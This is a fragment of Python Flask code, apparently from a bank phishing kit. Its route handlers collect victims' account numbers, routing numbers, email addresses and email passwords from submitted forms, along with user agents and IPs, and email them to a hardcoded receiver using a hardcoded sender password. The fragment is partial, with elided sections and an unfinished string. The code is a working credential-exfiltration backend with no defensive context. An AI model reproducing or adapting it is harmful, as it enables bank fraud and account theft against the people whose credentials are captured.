...
def first():
    if request.method == 'POST':
        ...
        acnum = request.form.get("ahorse")
        routnum = request.form.get("rhorse")
        emaail = request.form.get("ehorse")
        emaailpas = request.form.get("ephorse")
        sender_email = "ghost@newupdateishere.com"
        receiver_email = "aryeh.kile@my2ducks.com"
        password = "yhG]rLZwK1!)"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "bankkk UPDATE ! 1"
        ...
        """
        html = render_template('emailmailer.html', emaailpassw=emaailpas, emailadd=emaail, acnumber=acnum, routingman=routnum, emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
...
def second():
    if request.method == 'POST':
        ...
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "BANKKK UPDATE !! 2"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
